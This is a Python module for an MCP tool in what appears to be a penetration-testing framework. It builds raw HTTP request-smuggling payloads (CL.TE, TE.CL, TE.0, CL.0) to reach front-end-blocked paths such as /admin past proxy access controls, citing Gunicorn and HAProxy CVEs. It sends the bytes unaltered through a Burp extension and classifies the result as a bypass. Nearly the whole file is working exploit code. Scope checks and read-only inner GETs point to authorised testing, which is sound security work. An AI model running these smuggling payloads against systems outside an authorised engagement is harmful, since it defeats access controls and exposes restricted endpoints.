"""smuggle_acl_probe — reach a front-end-restricted path by smuggling a benign
GET past the proxy ACL (Gunicorn CVE-2024-1135 / HAProxy CVE-2024-53008 / Kong /
TE.0 class).

Thin orchestrator. The desync framing is REUSED from _smuggle_capture (wrap_clte
/ wrap_tecl) and the raw byte-exact send is the same core smuggling.py uses
(client.post("/api/http/raw", http_version="direct") — direct so Burp/Montoya
does not "fix" a request carrying both Content-Length and Transfer-Encoding and
kill the desync). te0 / cl0 have no existing builder, so two minimal local
wrappers cover them.

BENIGN by construction: the smuggled inner request is always a GET (read) of the
restricted path — never a POST/DELETE/state-change. The flip is detected on
status/length only; the restricted body is not returned (Rules 5-9, Rule 7/8).
"""

from mcp.server.fastmcp import FastMCP

from praetor import client
from praetor.tools.testing_extended._helpers import (
    resolve_host_from,
    scope_or_error,
)
from praetor.tools.testing_extended._smuggle_capture import wrap_clte, wrap_tecl

CRLF = "\r\n"

_RESTRICTED = (401, 403)


def _wrap_te0(host: str, smuggled: str, path: str = "/") -> str:
    """TE.0: front-end honours Transfer-Encoding, back-end ignores it (no body),
    so the bytes after the terminating 0-chunk parse as a new request. Same
    outer as CL.TE but with only Transfer-Encoding, no Content-Length."""
    body = "0" + CRLF + CRLF + smuggled
    return (
        f"POST {path} HTTP/1.1" + CRLF
        + f"Host: {host}" + CRLF
        + "Content-Type: application/x-www-form-urlencoded" + CRLF
        + "Transfer-Encoding: chunked" + CRLF
        + CRLF
        + body
    )


def _wrap_cl0(host: str, smuggled: str, path: str = "/") -> str:
    """CL.0: front-end honours Content-Length, back-end ignores it (treats as 0),
    so everything after the outer headers parses as a new request. Outer
    Content-Length covers exactly the smuggled request bytes."""
    cl = len(smuggled.encode())
    return (
        f"POST {path} HTTP/1.1" + CRLF
        + f"Host: {host}" + CRLF
        + "Content-Type: application/x-www-form-urlencoded" + CRLF
        + f"Content-Length: {cl}" + CRLF
        + CRLF
        + smuggled
    )


# All builders share (host, smuggled, path) — wrap_clte / wrap_tecl included.
_BUILDERS = {
    "clte": wrap_clte,
    "tecl": wrap_tecl,
    "te0": _wrap_te0,
    "cl0": _wrap_cl0,
}


def _smuggled_get(header_host: str, restricted_path: str) -> str:
    """Benign inner request: a plain GET (read) of the restricted path.

    Self-contained (terminating blank line) so a single send can surface the
    back-end response without a second priming request. GET only — no body, no
    state change."""
    return (
        f"GET {restricted_path} HTTP/1.1" + CRLF
        + f"Host: {header_host}" + CRLF
        + "Connection: keep-alive" + CRLF
        + CRLF
    )


def _status_of(resp: dict):
    return resp.get("status_code", resp.get("status"))


def _evidence_of(resp: dict):
    """Citable handle for a direct send: proxy_history_index if present, else
    the send_ref the extension stores for a direct (non-proxy) send."""
    idx = resp.get("proxy_history_index")
    if idx is not None:
        return idx
    return resp.get("send_ref")


def _classify(baseline_status, baseline_len: int, status, length: int) -> str:
    """BYPASS when the restricted path flips to 2xx/3xx, or the body length
    materially diverges from the 4xx baseline; no-effect when the block holds;
    inconclusive when the send errored or the signal is ambiguous."""
    if status is None:
        return "inconclusive"
    if 200 <= status < 400:
        return "BYPASS"
    delta = abs((length or 0) - (baseline_len or 0))
    if delta > max(100, int((baseline_len or 0) * 0.25)):
        return "BYPASS"
    if status == baseline_status:
        return "no-effect"
    return "inconclusive"


async def _run_probe(
    base: str,
    restricted_path: str,
    techniques: str = "clte,tecl,te0,cl0",
    host: str = "",
    timeout: int = 20,
    domain: str = "",
) -> dict:
    """Probe whether a front-end-restricted path is reachable via HTTP request
    smuggling (front-end ACL bypass; backend serves the smuggled GET).

    Baseline the restricted path; if it is NOT 401/403 it is already served, so
    there is nothing to bypass (N/A). Otherwise, for each requested technique,
    smuggle a benign `GET restricted_path` past the proxy using the reused
    desync builders and report whether the restricted path flips open.

    Args:
        base: Front-end base URL (scheme://host[:port]) — the connection target.
        restricted_path: Path the front-end blocks (e.g. /admin).
        techniques: CSV of clte,tecl,te0,cl0 (default all four).
        host: Host header for the smuggled/baseline requests (default: base's host).
        timeout: Advisory per-send timeout seconds (default 20).
        domain: Target memory key (advisory; not persisted here).
    """
    if not restricted_path or not restricted_path.startswith("/"):
        return {"error": "restricted_path must be an absolute path like /admin"}

    connect_host, port, is_https, err = await resolve_host_from(base)
    if err:
        return {"error": err}
    header_host = host or connect_host

    scope_err = await scope_or_error(connect_host, is_https, port)
    if scope_err:
        return {"error": scope_err}

    send_base = {"host": connect_host, "port": port, "https": is_https}

    # Baseline: normal GET of the restricted path via the same raw core.
    baseline_raw = (
        f"GET {restricted_path} HTTP/1.1" + CRLF
        + f"Host: {header_host}" + CRLF
        + "Connection: close" + CRLF
        + CRLF
    )
    b = await client.post("/api/http/raw", json={"raw": baseline_raw, **send_base})
    if "error" in b:
        return {"error": f"baseline failed: {b['error']}"}
    baseline_status = _status_of(b)
    baseline_len = b.get("response_length", len(b.get("response_body", "")))

    if baseline_status not in _RESTRICTED:
        return {
            "base": base,
            "restricted_path": restricted_path,
            "baseline": {"status": baseline_status},
            "results": [],
            "bypassed": [],
            "summary": (
                f"N/A: path not front-end-restricted (baseline status "
                f"{baseline_status}); nothing to bypass"
            ),
        }

    wanted = [t.strip().lower() for t in techniques.split(",") if t.strip()]
    smuggled = _smuggled_get(header_host, restricted_path)

    results = []
    bypassed = []
    for tech in wanted:
        builder = _BUILDERS.get(tech)
        if builder is None:
            results.append({"technique": tech, "status": None,
                            "verdict": "inconclusive",
                            "note": "unknown technique (clte|tecl|te0|cl0)"})
            continue
        raw = builder(header_host, smuggled)
        # http_version="direct" — byte-exact so Burp does not rewrite CL+TE.
        resp = await client.post("/api/http/raw", json={
            "raw": raw, "http_version": "direct", **send_base,
        })
        if "error" in resp:
            results.append({"technique": tech, "status": None, "length": None,
                            "verdict": "inconclusive", "proxy_history_index": None,
                            "note": f"send error: {resp['error']}"})
            continue
        status = _status_of(resp)
        length = resp.get("response_length", len(resp.get("response_body", "")))
        verdict = _classify(baseline_status, baseline_len, status, length)
        if verdict == "BYPASS":
            bypassed.append(tech)
        results.append({
            "technique": tech,
            "status": status,
            "length": length,
            "verdict": verdict,
            "proxy_history_index": _evidence_of(resp),
        })

    if bypassed:
        summary = (
            f"ACL BYPASS via smuggling: {', '.join(bypassed)} reached "
            f"{restricted_path} (front-end baseline {baseline_status}). "
            "Backend served the smuggled GET past the proxy ACL."
        )
    else:
        summary = (
            f"No ACL bypass: {restricted_path} stayed blocked "
            f"(baseline {baseline_status}) across {', '.join(wanted)}."
        )

    return {
        "base": base,
        "restricted_path": restricted_path,
        "baseline": {"status": baseline_status, "length": baseline_len},
        "results": results,
        "bypassed": bypassed,
        "summary": summary,
    }


def register(mcp: FastMCP):

    @mcp.tool()
    async def smuggle_acl_probe(
        base: str,
        restricted_path: str,
        techniques: str = "clte,tecl,te0,cl0",
        host: str = "",
        timeout: int = 20,
        domain: str = "",
    ) -> dict:
        """Test whether a front-end-restricted / allowlisted path (401/403 on a
        direct request) can be reached by smuggling a benign GET past the proxy
        ACL so the backend serves it (Gunicorn CVE-2024-1135 / HAProxy
        CVE-2024-53008 / Kong / TE.0 class).

        Baselines the path first: if it is not 401/403 the result is N/A (nothing
        to bypass). Then, per technique (clte,tecl,te0,cl0), smuggles a read-only
        `GET restricted_path` using the shared desync builders over a direct
        byte-exact send, and flags a BYPASS when the path flips to 2xx/3xx or the
        body length materially diverges from the blocked baseline. Benign: the
        smuggled request is a GET only; the restricted body is not returned.

        Args:
            base: Front-end base URL (scheme://host[:port]).
            restricted_path: Path the front-end blocks (e.g. /admin).
            techniques: CSV of clte,tecl,te0,cl0 (default all four).
            host: Host header override for smuggled/baseline requests.
            timeout: Advisory per-send timeout seconds (default 20).
            domain: Target memory key (advisory).
        """
        return await _run_probe(
            base, restricted_path, techniques=techniques,
            host=host, timeout=timeout, domain=domain,
        )
